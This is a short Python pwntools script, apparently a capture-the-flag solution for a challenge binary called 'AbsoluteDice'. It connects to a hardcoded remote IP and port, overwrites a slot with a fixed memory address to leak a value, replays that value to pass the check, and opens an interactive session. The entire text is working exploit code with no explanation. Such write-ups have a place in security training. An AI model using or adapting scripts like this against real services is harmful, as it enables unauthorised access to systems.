from pwn import *

io = remote('193.57.159.27', 35383)
# io = process('./AbsoluteDice')

for i in range(31):
	io.sendlineafter(b'> ', b'1')

file = 0x8048bb9
io.sendlineafter(b'> ', str(file).encode())

io.sendlineafter(b'> ', b'1')
io.recvuntil(b'had ')
num = io.recvline().decode().split(',')
num = num[0].encode()


for i in range(31):
	io.sendlineafter(b'> ', num)

# io.close()

io.interactive()